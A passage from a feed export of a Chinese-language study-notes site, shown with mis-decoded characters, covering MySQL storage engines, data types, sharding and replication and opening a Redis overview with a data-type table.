<span>SELECT</span> <span>*</span> <span>FROM</span> post <span>WHERE</span> post<span>.</span>id <span>IN</span> <span>(</span><span>123</span><span>,</span><span>456</span><span>,</span><span>567</span><span>,</span><span>9098</span><span>,</span><span>8904</span><span>)</span><span>;</span>
</code></pre></div><h1 id="å››ã€å­˜å‚¨å¼•æ“" tabindex="-1"> å››ã€å­˜å‚¨å¼•æ“</h1>
<h2 id="innodb" tabindex="-1"> InnoDB</h2>
<p>æ˜¯ MySQL é»˜è®¤çš„äº‹åŠ¡å‹å­˜å‚¨å¼•æ“ï¼Œåªæœ‰åœ¨éœ€è¦å®ƒä¸æ”¯æŒçš„ç‰¹æ€§æ—¶ï¼Œæ‰è€ƒè™‘ä½¿ç”¨å…¶å®ƒå­˜å‚¨å¼•æ“ã€‚</p>
<p>å®ç°äº†å››ä¸ªæ ‡å‡†çš„éš”ç¦»çº§åˆ«ï¼Œé»˜è®¤çº§åˆ«æ˜¯å¯é‡å¤è¯»ï¼ˆREPEATABLE READï¼‰ã€‚åœ¨å¯é‡å¤è¯»éš”ç¦»çº§åˆ«ä¸‹ï¼Œé€šè¿‡å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼ˆMVCCï¼‰+ Next-Key Locking é˜²æ­¢å¹»å½±è¯»ã€‚</p>
<p>ä¸»ç´¢å¼•æ˜¯èšç°‡ç´¢å¼•ï¼Œåœ¨ç´¢å¼•ä¸­ä¿å­˜äº†æ•°æ®ï¼Œä»è€Œé¿å…ç›´æ¥è¯»å–ç£ç›˜ï¼Œå› æ­¤å¯¹æŸ¥è¯¢æ€§èƒ½æœ‰å¾ˆå¤§çš„æå‡ã€‚</p>
<p>å†…éƒ¨åšäº†å¾ˆå¤šä¼˜åŒ–ï¼ŒåŒ…æ‹¬ä»ç£ç›˜è¯»å–æ•°æ®æ—¶é‡‡ç”¨çš„å¯é¢„æµ‹æ€§è¯»ã€èƒ½å¤ŸåŠ å¿«è¯»æ“ä½œå¹¶ä¸”è‡ªåŠ¨åˆ›å»ºçš„è‡ªé€‚åº”å“ˆå¸Œç´¢å¼•ã€èƒ½å¤ŸåŠ é€Ÿæ’å…¥æ“ä½œçš„æ’å…¥ç¼“å†²åŒºç­‰ã€‚</p>
<p>æ”¯æŒçœŸæ­£çš„åœ¨çº¿çƒ­å¤‡ä»½ã€‚å…¶å®ƒå­˜å‚¨å¼•æ“ä¸æ”¯æŒåœ¨çº¿çƒ­å¤‡ä»½ï¼Œè¦è·å–ä¸€è‡´æ€§è§†å›¾éœ€è¦åœæ­¢å¯¹æ‰€æœ‰è¡¨çš„å†™å…¥ï¼Œè€Œåœ¨è¯»å†™æ··åˆåœºæ™¯ä¸­ï¼Œåœæ­¢å†™å…¥å¯èƒ½ä¹Ÿæ„å‘³ç€åœæ­¢è¯»å–ã€‚</p>
<h2 id="myisam" tabindex="-1"> MyISAM</h2>
<p>è®¾è®¡ç®€å•ï¼Œæ•°æ®ä»¥ç´§å¯†æ ¼å¼å­˜å‚¨ã€‚å¯¹äºåªè¯»æ•°æ®ï¼Œæˆ–è€…è¡¨æ¯”è¾ƒå°ã€å¯ä»¥å®¹å¿ä¿®å¤æ“ä½œï¼Œåˆ™ä¾ç„¶å¯ä»¥ä½¿ç”¨å®ƒã€‚</p>
<p>æä¾›äº†å¤§é‡çš„ç‰¹æ€§ï¼ŒåŒ…æ‹¬å‹ç¼©è¡¨ã€ç©ºé—´æ•°æ®ç´¢å¼•ç­‰ã€‚</p>
<p>ä¸æ”¯æŒäº‹åŠ¡ã€‚</p>
<p>ä¸æ”¯æŒè¡Œçº§é”ï¼Œåªèƒ½å¯¹æ•´å¼ è¡¨åŠ é”ï¼Œè¯»å–æ—¶ä¼šå¯¹éœ€è¦è¯»åˆ°çš„æ‰€æœ‰è¡¨åŠ å…±äº«é”ï¼Œå†™å…¥æ—¶åˆ™å¯¹è¡¨åŠ æ’å®ƒé”ã€‚ä½†åœ¨è¡¨æœ‰è¯»å–æ“ä½œçš„åŒæ—¶ï¼Œä¹Ÿå¯ä»¥å¾€è¡¨ä¸­æ’å…¥æ–°çš„è®°å½•ï¼Œè¿™è¢«ç§°ä¸ºå¹¶å‘æ’å…¥ï¼ˆCONCURRENT INSERTï¼‰ã€‚</p>
<p>å¯ä»¥æ‰‹å·¥æˆ–è€…è‡ªåŠ¨æ‰§è¡Œæ£€æŸ¥å’Œä¿®å¤æ“ä½œï¼Œä½†æ˜¯å’Œäº‹åŠ¡æ¢å¤ä»¥åŠå´©æºƒæ¢å¤ä¸åŒï¼Œå¯èƒ½å¯¼è‡´ä¸€äº›æ•°æ®ä¸¢å¤±ï¼Œè€Œä¸”ä¿®å¤æ“ä½œæ˜¯éå¸¸æ…¢çš„ã€‚</p>
<p>å¦‚æœæŒ‡å®šäº† DELAY_KEY_WRITE é€‰é¡¹ï¼Œåœ¨æ¯æ¬¡ä¿®æ”¹æ‰§è¡Œå®Œæˆæ—¶ï¼Œä¸ä¼šç«‹å³å°†ä¿®æ”¹çš„ç´¢å¼•æ•°æ®å†™å…¥ç£ç›˜ï¼Œè€Œæ˜¯ä¼šå†™åˆ°å†…å­˜ä¸­çš„é”®ç¼“å†²åŒºï¼Œåªæœ‰åœ¨æ¸…ç†é”®ç¼“å†²åŒºæˆ–è€…å…³é—­è¡¨çš„æ—¶å€™æ‰ä¼šå°†å¯¹åº”çš„ç´¢å¼•å—å†™å…¥ç£ç›˜ã€‚è¿™ç§æ–¹å¼å¯ä»¥æå¤§çš„æå‡å†™å…¥æ€§èƒ½ï¼Œä½†æ˜¯åœ¨æ•°æ®åº“æˆ–è€…ä¸»æœºå´©æºƒæ—¶ä¼šé€ æˆç´¢å¼•æŸåï¼Œéœ€è¦æ‰§è¡Œä¿®å¤æ“ä½œã€‚</p>
<h2 id="æ¯”è¾ƒ" tabindex="-1"> æ¯”è¾ƒ</h2>
<ul>
<li>
<p>äº‹åŠ¡ï¼šInnoDB æ˜¯äº‹åŠ¡å‹çš„ï¼Œå¯ä»¥ä½¿ç”¨ Commit å’Œ Rollback è¯­å¥ã€‚</p>
</li>
<li>
<p>å¹¶å‘ï¼šMyISAM åªæ”¯æŒè¡¨çº§é”ï¼Œè€Œ InnoDB è¿˜æ”¯æŒè¡Œçº§é”ã€‚</p>
</li>
<li>
<p>å¤–é”®ï¼šInnoDB æ”¯æŒå¤–é”®ã€‚</p>
</li>
<li>
<p>å¤‡ä»½ï¼šInnoDB æ”¯æŒåœ¨çº¿çƒ­å¤‡ä»½ã€‚</p>
</li>
<li>
<p>å´©æºƒæ¢å¤ï¼šMyISAM å´©æºƒåå‘ç”ŸæŸåçš„æ¦‚ç‡æ¯” InnoDB é«˜å¾ˆå¤šï¼Œè€Œä¸”æ¢å¤çš„é€Ÿåº¦ä¹Ÿæ›´æ…¢ã€‚</p>
</li>
<li>
<p>å…¶å®ƒç‰¹æ€§ï¼šMyISAM æ”¯æŒå‹ç¼©è¡¨å’Œç©ºé—´æ•°æ®ç´¢å¼•ã€‚</p>
</li>
</ul>
<h1 id="äº”ã€æ•°æ®ç±»å‹" tabindex="-1"> äº”ã€æ•°æ®ç±»å‹</h1>
<h2 id="æ•´å‹" tabindex="-1"> æ•´å‹</h2>
<p>TINYINT, SMALLINT, MEDIUMINT, INT, BIGINT åˆ†åˆ«ä½¿ç”¨ 8, 16, 24, 32, 64 ä½å­˜å‚¨ç©ºé—´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¶Šå°çš„åˆ—è¶Šå¥½ã€‚</p>
<p>INT(11) ä¸­çš„æ•°å­—åªæ˜¯è§„å®šäº†äº¤äº’å·¥å…·æ˜¾ç¤ºå­—ç¬¦çš„ä¸ªæ•°ï¼Œå¯¹äºå­˜å‚¨å’Œè®¡ç®—æ¥è¯´æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚</p>
<h2 id="æµ®ç‚¹æ•°" tabindex="-1"> æµ®ç‚¹æ•°</h2>
<p>FLOAT å’Œ DOUBLE ä¸ºæµ®ç‚¹ç±»å‹ï¼ŒDECIMAL ä¸ºé«˜ç²¾åº¦å°æ•°ç±»å‹ã€‚CPU åŸç”Ÿæ”¯æŒæµ®ç‚¹è¿ç®—ï¼Œä½†æ˜¯ä¸æ”¯æŒ DECIMAl ç±»å‹çš„è®¡ç®—ï¼Œå› æ­¤ DECIMAL çš„è®¡ç®—æ¯”æµ®ç‚¹ç±»å‹éœ€è¦æ›´é«˜çš„ä»£ä»·ã€‚</p>
<p>FLOATã€DOUBLE å’Œ DECIMAL éƒ½å¯ä»¥æŒ‡å®šåˆ—å®½ï¼Œä¾‹å¦‚ DECIMAL(18, 9) è¡¨ç¤ºæ€»å…± 18 ä½ï¼Œå– 9 ä½å­˜å‚¨å°æ•°éƒ¨åˆ†ï¼Œå‰©ä¸‹ 9 ä½å­˜å‚¨æ•´æ•°éƒ¨åˆ†ã€‚</p>
<h2 id="å­—ç¬¦ä¸²" tabindex="-1"> å­—ç¬¦ä¸²</h2>
<p>ä¸»è¦æœ‰ CHAR å’Œ VARCHAR ä¸¤ç§ç±»å‹ï¼Œä¸€ç§æ˜¯å®šé•¿çš„ï¼Œä¸€ç§æ˜¯å˜é•¿çš„ã€‚</p>
<p>VARCHAR è¿™ç§å˜é•¿ç±»å‹èƒ½å¤ŸèŠ‚çœç©ºé—´ï¼Œå› ä¸ºåªéœ€è¦å­˜å‚¨å¿…è¦çš„å†…å®¹ã€‚ä½†æ˜¯åœ¨æ‰§è¡Œ UPDATE æ—¶å¯èƒ½ä¼šä½¿è¡Œå˜å¾—æ¯”åŸæ¥é•¿ï¼Œå½“è¶…å‡ºä¸€ä¸ªé¡µæ‰€èƒ½å®¹çº³çš„å¤§å°æ—¶ï¼Œå°±è¦æ‰§è¡Œé¢å¤–çš„æ“ä½œã€‚MyISAM ä¼šå°†è¡Œæ‹†æˆä¸åŒçš„ç‰‡æ®µå­˜å‚¨ï¼Œè€Œ InnoDB åˆ™éœ€è¦åˆ†è£‚é¡µæ¥ä½¿è¡Œæ”¾è¿›é¡µå†…ã€‚</p>
<p>åœ¨è¿›è¡Œå­˜å‚¨å’Œæ£€ç´¢æ—¶ï¼Œä¼šä¿ç•™ VARCHAR æœ«å°¾çš„ç©ºæ ¼ï¼Œè€Œä¼šåˆ é™¤ CHAR æœ«å°¾çš„ç©ºæ ¼ã€‚</p>
<h2 id="æ—¶é—´å’Œæ—¥æœŸ" tabindex="-1"> æ—¶é—´å’Œæ—¥æœŸ</h2>
<p>MySQL æä¾›äº†ä¸¤ç§ç›¸ä¼¼çš„æ—¥æœŸæ—¶é—´ç±»å‹ï¼šDATETIME å’Œ TIMESTAMPã€‚</p>
<h3 id="_1-datetime" tabindex="-1"> 1. DATETIME</h3>
<p>èƒ½å¤Ÿä¿å­˜ä» 1000 å¹´åˆ° 9999 å¹´çš„æ—¥æœŸå’Œæ—¶é—´ï¼Œç²¾åº¦ä¸ºç§’ï¼Œä½¿ç”¨ 8 å­—èŠ‚çš„å­˜å‚¨ç©ºé—´ã€‚</p>
<p>å®ƒä¸æ—¶åŒºæ— å…³ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒMySQL ä»¥ä¸€ç§å¯æ’åºçš„ã€æ— æ­§ä¹‰çš„æ ¼å¼æ˜¾ç¤º DATETIME å€¼ï¼Œä¾‹å¦‚â€œ2008-01-16 22<span>:</span>37<span>:</span>08â€ï¼Œè¿™æ˜¯ ANSI æ ‡å‡†å®šä¹‰çš„æ—¥æœŸå’Œæ—¶é—´è¡¨ç¤ºæ–¹æ³•ã€‚</p>
<h3 id="_2-timestamp" tabindex="-1"> 2. TIMESTAMP</h3>
<p>å’Œ UNIX æ—¶é—´æˆ³ç›¸åŒï¼Œä¿å­˜ä» 1970 å¹´ 1 æœˆ 1 æ—¥åˆå¤œï¼ˆæ ¼æ—å¨æ²»æ—¶é—´ï¼‰ä»¥æ¥çš„ç§’æ•°ï¼Œä½¿ç”¨ 4 ä¸ªå­—èŠ‚ï¼Œåªèƒ½è¡¨ç¤ºä» 1970 å¹´åˆ° 2038 å¹´ã€‚</p>
<p>å®ƒå’Œæ—¶åŒºæœ‰å…³ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªæ—¶é—´æˆ³åœ¨ä¸åŒçš„æ—¶åŒºæ‰€ä»£è¡¨çš„å…·ä½“æ—¶é—´æ˜¯ä¸åŒçš„ã€‚</p>
<p>MySQL æä¾›äº† FROM_UNIXTIME() å‡½æ•°æŠŠ UNIX æ—¶é—´æˆ³è½¬æ¢ä¸ºæ—¥æœŸï¼Œå¹¶æä¾›äº† UNIX_TIMESTAMP() å‡½æ•°æŠŠæ—¥æœŸè½¬æ¢ä¸º UNIX æ—¶é—´æˆ³ã€‚</p>
<p>é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ’å…¥æ—¶æ²¡æœ‰æŒ‡å®š TIMESTAMP åˆ—çš„å€¼ï¼Œä¼šå°†è¿™ä¸ªå€¼è®¾ç½®ä¸ºå½“å‰æ—¶é—´ã€‚</p>
<p>åº”è¯¥å°½é‡ä½¿ç”¨ TIMESTAMPï¼Œå› ä¸ºå®ƒæ¯” DATETIME ç©ºé—´æ•ˆç‡æ›´é«˜ã€‚</p>
<h1 id="å…­ã€åˆ‡åˆ†" tabindex="-1"> å…­ã€åˆ‡åˆ†</h1>
<h2 id="æ°´å¹³åˆ‡åˆ†" tabindex="-1"> æ°´å¹³åˆ‡åˆ†</h2>
<p>æ°´å¹³åˆ‡åˆ†åˆç§°ä¸º Shardingï¼Œå®ƒæ˜¯å°†åŒä¸€ä¸ªè¡¨ä¸­çš„è®°å½•æ‹†åˆ†åˆ°å¤šä¸ªç»“æ„ç›¸åŒçš„è¡¨ä¸­ã€‚</p>
<p>å½“ä¸€ä¸ªè¡¨çš„æ•°æ®ä¸æ–­å¢å¤šæ—¶ï¼ŒSharding æ˜¯å¿…ç„¶çš„é€‰æ‹©ï¼Œå®ƒå¯ä»¥å°†æ•°æ®åˆ†å¸ƒåˆ°é›†ç¾¤çš„ä¸åŒèŠ‚ç‚¹ä¸Šï¼Œä»è€Œç¼“å­˜å•ä¸ªæ•°æ®åº“çš„å‹åŠ›ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/63c2909f-0c5f-496f-9fe5-ee9176b31aba.jpg" width="300px"> </div><br>
<h2 id="å‚ç›´åˆ‡åˆ†" tabindex="-1"> å‚ç›´åˆ‡åˆ†</h2>
<p>å‚ç›´åˆ‡åˆ†æ˜¯å°†ä¸€å¼ è¡¨æŒ‰åˆ—åˆ‡åˆ†æˆå¤šä¸ªè¡¨ï¼Œé€šå¸¸æ˜¯æŒ‰ç…§åˆ—çš„å…³ç³»å¯†é›†ç¨‹åº¦è¿›è¡Œåˆ‡åˆ†ï¼Œä¹Ÿå¯ä»¥åˆ©ç”¨å‚ç›´åˆ‡åˆ†å°†ç»å¸¸è¢«ä½¿ç”¨çš„åˆ—å’Œä¸ç»å¸¸è¢«ä½¿ç”¨çš„åˆ—åˆ‡åˆ†åˆ°ä¸åŒçš„è¡¨ä¸­ã€‚</p>
<p>åœ¨æ•°æ®åº“çš„å±‚é¢ä½¿ç”¨å‚ç›´åˆ‡åˆ†å°†æŒ‰æ•°æ®åº“ä¸­è¡¨çš„å¯†é›†ç¨‹åº¦éƒ¨ç½²åˆ°ä¸åŒçš„åº“ä¸­ï¼Œä¾‹å¦‚å°†åŸæ¥çš„ç”µå•†æ•°æ®åº“å‚ç›´åˆ‡åˆ†æˆå•†å“æ•°æ®åº“ã€ç”¨æˆ·æ•°æ®åº“ç­‰ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/e130e5b8-b19a-4f1e-b860-223040525cf6.jpg" width="300px"> </div><br>
<h2 id="sharding-ç­–ç•¥" tabindex="-1"> Sharding ç­–ç•¥</h2>
<ul>
<li>å“ˆå¸Œå–æ¨¡ï¼šhash(key) % Nï¼›</li>
<li>èŒƒå›´ï¼šå¯ä»¥æ˜¯ ID èŒƒå›´ä¹Ÿå¯ä»¥æ˜¯æ—¶é—´èŒƒå›´ï¼›</li>
<li>æ˜ å°„è¡¨ï¼šä½¿ç”¨å•ç‹¬çš„ä¸€ä¸ªæ•°æ®åº“æ¥å­˜å‚¨æ˜ å°„å…³ç³»ã€‚</li>
</ul>
<h2 id="sharding-å­˜åœ¨çš„é—®é¢˜" tabindex="-1"> Sharding å­˜åœ¨çš„é—®é¢˜</h2>
<h3 id="_1-äº‹åŠ¡é—®é¢˜" tabindex="-1"> 1. äº‹åŠ¡é—®é¢˜</h3>
<p>ä½¿ç”¨åˆ†å¸ƒå¼äº‹åŠ¡æ¥è§£å†³ï¼Œæ¯”å¦‚ XA æ¥å£ã€‚</p>
<h3 id="_2-è¿æ¥" tabindex="-1"> 2. è¿æ¥</h3>
<p>å¯ä»¥å°†åŸæ¥çš„è¿æ¥åˆ†è§£æˆå¤šä¸ªå•è¡¨æŸ¥è¯¢ï¼Œç„¶ååœ¨ç”¨æˆ·ç¨‹åºä¸­è¿›è¡Œè¿æ¥ã€‚</p>
<h3 id="_3-id-å”¯ä¸€æ€§" tabindex="-1"> 3. ID å”¯ä¸€æ€§</h3>
<ul>
<li>ä½¿ç”¨å…¨å±€å”¯ä¸€ IDï¼ˆGUIDï¼‰</li>
<li>ä¸ºæ¯ä¸ªåˆ†ç‰‡æŒ‡å®šä¸€ä¸ª ID èŒƒå›´</li>
<li>åˆ†å¸ƒå¼ ID ç”Ÿæˆå™¨ (å¦‚ Twitter çš„ Snowflake ç®—æ³•)</li>
</ul>
<h1 id="ä¸ƒã€å¤åˆ¶" tabindex="-1"> ä¸ƒã€å¤åˆ¶</h1>
<h2 id="ä¸»ä»å¤åˆ¶" tabindex="-1"> ä¸»ä»å¤åˆ¶</h2>
<p>ä¸»è¦æ¶‰åŠä¸‰ä¸ªçº¿ç¨‹ï¼šbinlog çº¿ç¨‹ã€I/O çº¿ç¨‹å’Œ SQL çº¿ç¨‹ã€‚</p>
<ul>
<li><strong>binlog çº¿ç¨‹</strong> ï¼šè´Ÿè´£å°†ä¸»æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ›´æ”¹å†™å…¥äºŒè¿›åˆ¶æ—¥å¿—ï¼ˆBinary logï¼‰ä¸­ã€‚</li>
<li><strong>I/O çº¿ç¨‹</strong> ï¼šè´Ÿè´£ä»ä¸»æœåŠ¡å™¨ä¸Šè¯»å–äºŒè¿›åˆ¶æ—¥å¿—ï¼Œå¹¶å†™å…¥ä»æœåŠ¡å™¨çš„ä¸­ç»§æ—¥å¿—ï¼ˆRelay logï¼‰ã€‚</li>
<li><strong>SQL çº¿ç¨‹</strong> ï¼šè´Ÿè´£è¯»å–ä¸­ç»§æ—¥å¿—ï¼Œè§£æå‡ºä¸»æœåŠ¡å™¨å·²ç»æ‰§è¡Œçš„æ•°æ®æ›´æ”¹å¹¶åœ¨ä»æœåŠ¡å™¨ä¸­é‡æ”¾ï¼ˆReplayï¼‰ã€‚</li>
</ul>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/master-slave.png" width="300px"> </div><br>
<h2 id="è¯»å†™åˆ†ç¦»" tabindex="-1"> è¯»å†™åˆ†ç¦»</h2>
<p>ä¸»æœåŠ¡å™¨å¤„ç†å†™æ“ä½œä»¥åŠå®æ—¶æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„è¯»æ“ä½œï¼Œè€Œä»æœåŠ¡å™¨å¤„ç†è¯»æ“ä½œã€‚</p>
<p>è¯»å†™åˆ†ç¦»èƒ½æé«˜æ€§èƒ½çš„åŸå› åœ¨äºï¼š</p>
<ul>
<li>ä¸»ä»æœåŠ¡å™¨è´Ÿè´£å„è‡ªçš„è¯»å’Œå†™ï¼Œæå¤§ç¨‹åº¦ç¼“è§£äº†é”çš„äº‰ç”¨ï¼›</li>
<li>ä»æœåŠ¡å™¨å¯ä»¥ä½¿ç”¨ MyISAMï¼Œæå‡æŸ¥è¯¢æ€§èƒ½ä»¥åŠèŠ‚çº¦ç³»ç»Ÿå¼€é”€ï¼›</li>
<li>å¢åŠ å†—ä½™ï¼Œæé«˜å¯ç”¨æ€§ã€‚</li>
</ul>
<p>è¯»å†™åˆ†ç¦»å¸¸ç”¨ä»£ç†æ–¹å¼æ¥å®ç°ï¼Œä»£ç†æœåŠ¡å™¨æ¥æ”¶åº”ç”¨å±‚ä¼ æ¥çš„è¯»å†™è¯·æ±‚ï¼Œç„¶åå†³å®šè½¬å‘åˆ°å“ªä¸ªæœåŠ¡å™¨ã€‚</p>
<div align="center"> <img src="https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/master-slave-proxy.png" width="350px"> </div><br>
<h1 id="å‚è€ƒèµ„æ–™" tabindex="-1"> å‚è€ƒèµ„æ–™</h1>
<ul>
<li>BaronScbwartz, PeterZaitsev, VadimTkacbenko, ç­‰. é«˜æ€§èƒ½ MySQL[M]. ç”µå­å·¥ä¸šå‡ºç‰ˆç¤¾, 2013.</li>
<li>å§œæ‰¿å°§. MySQL æŠ€æœ¯å†…å¹•: InnoDB å­˜å‚¨å¼•æ“ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2011.</li>
<li><a href="https://www.jfox.info/20-tiao-mysql-xing-nen-you-hua-de-zui-jia-jing-yan.html" target="_blank" rel="noopener noreferrer">20+ æ¡ MySQL æ€§èƒ½ä¼˜åŒ–çš„æœ€ä½³ç»éªŒ</a></li>
<li><a href="http://blog.720ui.com/2017/mysql_core_09_multi_db_table2/" title="æœåŠ¡ç«¯æŒ‡å— æ•°æ®å­˜å‚¨ç¯‡ | MySQLï¼ˆ09ï¼‰ åˆ†åº“ä¸åˆ†è¡¨å¸¦æ¥çš„åˆ†å¸ƒå¼å›°å¢ƒä¸åº”å¯¹ä¹‹ç­–" target="_blank" rel="noopener noreferrer">æœåŠ¡ç«¯æŒ‡å— æ•°æ®å­˜å‚¨ç¯‡ | MySQLï¼ˆ09ï¼‰ åˆ†åº“ä¸åˆ†è¡¨å¸¦æ¥çš„åˆ†å¸ƒå¼å›°å¢ƒä¸åº”å¯¹ä¹‹ç­–</a></li>
<li><a href="https://stackoverflow.com/questions/788829/how-to-create-unique-row-id-in-sharded-databases" target="_blank" rel="noopener noreferrer">How to create unique row ID in sharded databases?</a></li>
<li><a href="http://geekswithblogs.net/shaunxu/archive/2012/01/07/sql-azure-federation-ndash-introduction.aspx" title="Title of this entry." target="_blank" rel="noopener noreferrer">SQL Azure Federation â€“ Introduction</a></li>
<li><a href="http://blog.codinglabs.org/articles/theory-of-mysql-index.html" target="_blank" rel="noopener noreferrer">MySQL ç´¢å¼•èƒŒåçš„æ•°æ®ç»“æ„åŠç®—æ³•åŸç†</a></li>
<li><a href="https://segmentfault.com/a/1190000008131735" target="_blank" rel="noopener noreferrer">MySQL æ€§èƒ½ä¼˜åŒ–ç¥å™¨ Explain ä½¿ç”¨åˆ†æ</a></li>
<li><a href="https://medium.com/@jeeyoungk/how-sharding-works-b4dec46b3f6" target="_blank" rel="noopener noreferrer">How Sharding Works</a></li>
<li><a href="https://tech.meituan.com/dianping_order_db_sharding.html" target="_blank" rel="noopener noreferrer">å¤§ä¼—ç‚¹è¯„è®¢å•ç³»ç»Ÿåˆ†åº“åˆ†è¡¨å®è·µ</a></li>
<li><a href="https://zh.wikipedia.org/wiki/B%2B%E6%A0%91" target="_blank" rel="noopener noreferrer">B + æ ‘</a></li>
</ul>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">æ•°æ®åº“</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">ä¸€ã€æ¦‚è¿°</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E6%95%B0%E6%8D%AE%E5%BA%93/Redis.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li></li>
<li>
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li></li>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>

<h1 id="ä¸€ã€æ¦‚è¿°" tabindex="-1"> ä¸€ã€æ¦‚è¿°</h1>
<p>Redis æ˜¯é€Ÿåº¦éå¸¸å¿«çš„éå…³ç³»å‹ï¼ˆNoSQLï¼‰å†…å­˜é”®å€¼æ•°æ®åº“ï¼Œå¯ä»¥å­˜å‚¨é”®å’Œäº”ç§ä¸åŒç±»å‹çš„å€¼ä¹‹é—´çš„æ˜ å°„ã€‚</p>
<p>é”®çš„ç±»å‹åªèƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œå€¼æ”¯æŒäº”ç§æ•°æ®ç±»å‹ï¼šå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€é›†åˆã€æ•£åˆ—è¡¨ã€æœ‰åºé›†åˆã€‚</p>
<p>Redis æ”¯æŒå¾ˆå¤šç‰¹æ€§ï¼Œä¾‹å¦‚å°†å†…å­˜ä¸­çš„æ•°æ®æŒä¹…åŒ–åˆ°ç¡¬ç›˜ä¸­ï¼Œä½¿ç”¨å¤åˆ¶æ¥æ‰©å±•è¯»æ€§èƒ½ï¼Œä½¿ç”¨åˆ†ç‰‡æ¥æ‰©å±•å†™æ€§èƒ½ã€‚</p>
<h1 id="äºŒã€æ•°æ®ç±»å‹" tabindex="-1"> äºŒã€æ•°æ®ç±»å‹</h1>
<table>
<thead>
<tr>
<th style="text-align:center">æ•°æ®ç±»å‹</th>
<th style="text-align:center">å¯ä»¥å­˜å‚¨çš„å€¼</th>
<th style="text-align:center">æ“ä½œ</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">STRING</td>
<td style="text-align:center">å­—ç¬¦ä¸²ã€æ•´æ•°æˆ–è€…æµ®ç‚¹æ•°</td>
<td style="text-align:center">å¯¹æ•´ä¸ªå­—ç¬¦ä¸²æˆ–è€…å­—ç¬¦ä¸²çš„å…¶ä¸­ä¸€éƒ¨åˆ†æ‰§è¡Œæ“ä½œ<br> å¯¹æ•´æ•°å’Œæµ®ç‚¹æ•°æ‰§è¡Œè‡ªå¢æˆ–è€…è‡ªå‡æ“ä½œ</td>
</tr>
<tr>
<td style="text-align:center">LIST</td>
<td style="text-align:center">åˆ—è¡¨</td>
<td style="text-align:center">ä»ä¸¤ç«¯å‹å…¥æˆ–è€…å¼¹å‡ºå…ƒç´  <br> å¯¹å•ä¸ªæˆ–è€…å¤šä¸ªå…ƒç´ è¿›è¡Œä¿®å‰ªï¼Œ<br> åªä¿ç•™ä¸€ä¸ªèŒƒå›´å†…çš„å…ƒç´ </td>
</tr>
<tr>
<td style="text-align:center">SET</td>
<td style="text-align:center">æ— åºé›†åˆ</td>
<td style="text-align:center">æ·»åŠ ã€è·å–ã€ç§»é™¤å•ä¸ªå…ƒç´ <br> æ£€æŸ¥ä¸€ä¸ªå…ƒç´ æ˜¯å¦å­˜åœ¨äºé›†åˆä¸­<br> è®¡ç®—äº¤é›†ã€å¹¶é›†ã€å·®é›†<br> ä»é›†åˆé‡Œé¢éšæœºè·å–å…ƒç´ </td>
</tr>
<tr>
<td style="text-align:center">HASH</td>
<td style="text-align:center">åŒ…å«é”®å€¼å¯¹çš„æ— åºæ•£åˆ—è¡¨</td>
<td style="text-align:center">æ·»åŠ ã€è·å–ã€ç§»é™¤å•ä¸ªé”®å€¼å¯¹<br> è·å–æ‰€æœ‰é”®å€¼å¯¹<br> æ£€æŸ¥æŸä¸ªé”®æ˜¯å¦å­˜åœ¨</td>
</tr>
<tr>
<td style="text-align:center">ZSET</td>
<td style="text-align:center">æœ‰åºé›†åˆ</td>
<td style="text-align:center">æ·»åŠ ã€è·å–ã€åˆ é™¤å…ƒç´ <br> æ ¹æ®åˆ†å€¼èŒƒå›´æˆ–è€…æˆå‘˜æ¥è·å–å…ƒç´ <br> è®¡ç®—ä¸€ä¸ªé”®çš„æ’å</td>
</tr>
</tbody>
</table>
<blockquote>
<p><a href="https://redislabs.com/ebook/part-1-getting-started/chapter-1-getting-to-know-redis/1-2-what-redis-data-structures-look-like/" target="_blank" rel="noopener noreferrer">What Redis data structures look like</a></p>
</blockquote>
<p><img src="@source/assets/cs-note/distribute/mk-2020-09-01-09-54-41.png" alt="" loading="lazy"></p>
